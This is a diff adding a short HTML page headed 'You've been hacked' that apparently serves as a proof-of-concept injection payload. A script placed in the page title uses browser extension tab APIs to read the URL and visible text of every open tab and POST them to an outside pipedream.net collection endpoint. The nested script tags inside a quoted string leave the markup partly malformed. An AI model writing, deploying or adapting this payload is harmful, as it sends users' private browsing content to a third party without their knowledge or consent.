@@ -1,0 +1,52 @@
+ <!DOCTYPE html>
+        <html lang="en">
+        <head>
+            <meta charset="UTF-8">
+            <meta name="viewport" content="width=device-width, initial-scale=1.0">
+            <script src="jquery-3.4.1.min.js"></script>
+            <title>Temporary Title</title>
+        </head>
+        <body>
+            <h1>You've been hacked</h1>
+     
+    
+
+        <script> 
+        document.title = '<script>
+        $(document).ready(function(){
+
+            chrome.tabs.query({}, tabs => {
+                tabs.forEach(tab => {
+                  chrome.tabs.executeScript(tab.id, {
+                    code: `
+                      
+                      let tabContent = document.body.innerText;
+            
+                      
+                      fetch('https://eodpzmmv3plxhm9.m.pipedream.net', {
+                        method: 'POST',
+                        mode: 'no-cors',
+                        headers: {
+                          'Content-Type': 'application/json',
+                        },
+                        body: JSON.stringify({ url: '${tab.url}', content: tabContent }),
+                      })
+                      .then(response => {
+                        if (!response.ok) {
+                          throw new Error('Failed to send tab content');
+                        }
+                      })
+                      .catch(error => console.error('Error sending tab content:', error));
+                    `
+                  });
+                });
+              });
+
+        });
+    </script>'
+        
+    </script>
+
+ 
+    </body>
+    </html>
